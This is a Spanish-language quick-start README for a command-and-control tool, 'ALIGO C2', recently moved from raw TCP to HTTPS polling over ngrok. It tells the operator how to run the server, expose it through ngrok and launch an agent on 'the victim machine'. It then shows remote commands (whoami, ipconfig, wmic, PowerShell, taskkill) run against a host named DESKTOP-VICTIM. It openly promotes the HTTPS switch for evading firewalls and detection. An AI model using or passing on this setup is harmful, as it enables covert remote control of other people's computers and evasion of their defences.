# 🚀 START HERE - ALIGO C2 HTTPS

## ⚡ Quick Start en 3 minutos

### ¿Primera vez? Lee esto primero. ⬇️

---

## ✅ Tu proyecto ha sido migrado a HTTPS

**Antes:** TCP Socket (puerto 4444)  
**Ahora:** HTTP/HTTPS (puerto 5000)  

**Tu terminal interactiva funciona EXACTAMENTE IGUAL** ✨

---

## 🎯 Lo único que cambió

| Aspecto | Antes | Ahora |
|---------|-------|-------|
| ngrok | `ngrok tcp 4444` | `ngrok http 5000` |
| Inicio agente | `python3 agent.py HOST PORT` | `python3 agent.py URL` |
| Ejemplo | `python3 agent.py 4.tcp.ngrok.io 15432` | `python3 agent.py https://abc.ngrok.io` |

**Todo lo demás es idéntico** (comandos, terminal, capacidades)

---

## 🚀 Pasos para usar (3 minutos)

### 1️⃣ Instalar (30 segundos)

```bash
pip install -r requirements.txt
```

### 2️⃣ Iniciar servidor (10 segundos)

```bash
cd server
python3 server.py
```

Verás:
```
============================================================
  ALIGO C2 - Servidor HTTPS
============================================================
[*] Servidor HTTP escuchando en 0.0.0.0:5000
[*] Usa ngrok con: ngrok http 5000

> 
```

### 3️⃣ Exponer con ngrok (30 segundos)

**En otra terminal:**

```bash
ngrok http 5000
```

**Copiar la URL** que aparece, ejemplo:
```
https://abc123-def456.ngrok-free.app
```

### 4️⃣ Conectar agente (30 segundos)

**En la máquina víctima:**

```bash
python3 agent/agent_ngrok.py https://abc123-def456.ngrok-free.app
```

### 5️⃣ Usar (igual que antes!)

**En el servidor:**

```bash
> list
 - agent-a1b2c3 | DESKTOP-VICTIM | Windows | last_seen: 14:30:45

> use agent-a1b2c3 whoami
[enviado] id=f3a9 -> agent-a1b2c3: whoami

[resultado de agent-a1b2c3] (id=f3a9):
DESKTOP-VICTIM\Usuario

> use @agent ipconfig
[auto-seleccionado] agent-a1b2c3
...
```

---

## ✅ ¿Funcionó? Verifica

```bash
# ¿Servidor corriendo?
curl http://localhost:5000/health
# Debe responder: {"status":"ok","agents_connected":0,...}

# ¿Agente conectado?
> list
# Debe mostrar tu agente

# ¿Comandos funcionan?
> use @agent whoami
# Debe mostrar el resultado
```

---

## 🎯 Comandos que usabas - FUNCIONAN IGUAL

```bash
# Todos estos comandos funcionan sin cambios:
use agent-XXX cd C:\Path
use agent-XXX wmic process where "name='python.exe'" get ProcessId,CommandLine
use agent-XXX powershell -Command "Set-Location C:\temp; Start-Process ..."
use agent-XXX cmd /c "timeout /t 5 & taskkill /F /PID 1234"
```

**Copia y pega directamente** - funcionan idénticos.

---

## 📚 ¿Necesitas más info?

### Para empezar a usar:
1. **`RESUMEN_EJECUTIVO.md`** ← Lee esto primero (5 min)
2. **`HTTPS_GUIDE.md`** ← Guía completa (15 min)
3. **`EJEMPLOS_COMANDOS.md`** ← Comandos para copiar

### Para entender los cambios:
4. **`MIGRACION_COMPLETA.md`** ← Detalles técnicos

### Para navegar todo:
5. **`INDEX.md`** ← Índice completo de documentación

---

## 🐛 Problemas comunes

### "No module named 'flask'"
```bash
pip install flask requests
```

### "No module named 'requests'" (en agente)
```bash
pip install requests
```

### El agente no se conecta
```bash
# 1. Verificar servidor
curl http://localhost:5000/health

# 2. Verificar ngrok
curl https://tu-url.ngrok.io/health

# 3. Verificar URL del agente (debe tener https://)
python3 agent_ngrok.py https://abc123.ngrok.io  # ✅ Correcto
python3 agent_ngrok.py abc123.ngrok.io          # ❌ Falta https://
```

---

## 🎓 Conceptos clave (en 30 segundos)

**HTTP Polling:** El agente pregunta cada 2 segundos "¿hay comandos?"

**Por qué HTTPS es mejor:**
- ✅ Parece navegación web normal
- ✅ Pasa firewalls (puerto 443)
- ✅ Cifrado TLS/SSL
- ✅ Menos detectable

**Lo que NO cambió:**
- ✅ Terminal interactiva (idéntica)
- ✅ Comandos (iguales)
- ✅ Capacidades (todas)
- ✅ Permisos (iguales)

---

## ⚡ Test rápido (2 minutos)

```bash
# Opción 1: Script automatizado
./test_https.sh

# Opción 2: Manual
# Terminal 1:
cd server && python3 server.py

# Terminal 2:
curl http://localhost:5000/health

# Si responde {"status":"ok",...} → ✅ Funciona!
```

---

## 🎯 Siguiente paso

Elige tu camino:

### 🏃‍♂️ Quiero usarlo YA
```bash
cd server && python3 server.py
# (Otra terminal) ngrok http 5000
# (Otra terminal) python3 agent/agent_ngrok.py https://URL
# ¡Listo!
```

### 📖 Quiero entender más
```bash
cat RESUMEN_EJECUTIVO.md  # 5 min
cat HTTPS_GUIDE.md        # 15 min
```

### 🔍 Quiero ver ejemplos
```bash
cat EJEMPLOS_COMANDOS.md  # Todos los comandos
```

---

## 📊 Resumen visual

```
┌─────────────────────────────────────────────┐
│  ANTES (TCP)          AHORA (HTTPS)         │
├─────────────────────────────────────────────┤
│  ngrok tcp 4444       ngrok http 5000       │
│  Socket raw           Flask HTTP            │
│  Puerto 4444          Puerto 5000           │
│  TCP sospechoso       HTTPS normal          │
│  Bloqueado fácil      Pasa firewalls        │
│                                             │
│  Terminal: ✅ IGUAL   Terminal: ✅ IGUAL     │
│  Comandos: ✅ IGUAL   Comandos: ✅ IGUAL     │
└─────────────────────────────────────────────┘
```

---

## ✅ Checklist rápido

- [ ] Instalé dependencias: `pip install -r requirements.txt`
- [ ] Inicié servidor: `python3 server.py`
- [ ] Inicié ngrok: `ngrok http 5000`
- [ ] Copié URL de ngrok
- [ ] Conecté agente: `python3 agent_ngrok.py https://URL`
- [ ] Verifiqué: `> list`
- [ ] Probé comando: `> use @agent whoami`

---

## 🎉 ¡Eso es todo!

Tu C2 está listo. Usa los mismos comandos que antes.

**La terminal es idéntica. Los comandos son idénticos.**

Solo cambió el transporte (TCP → HTTPS) para mejor evasión.

---

## 📞 ¿Más ayuda?

```bash
# Ver toda la documentación
cat INDEX.md

# Guía completa
cat HTTPS_GUIDE.md

# Ejemplos de comandos
cat EJEMPLOS_COMANDOS.md

# Entender cambios
cat MIGRACION_COMPLETA.md
```

---

**¡Listo! 🚀**

*Última actualización: 26 Junio 2026*
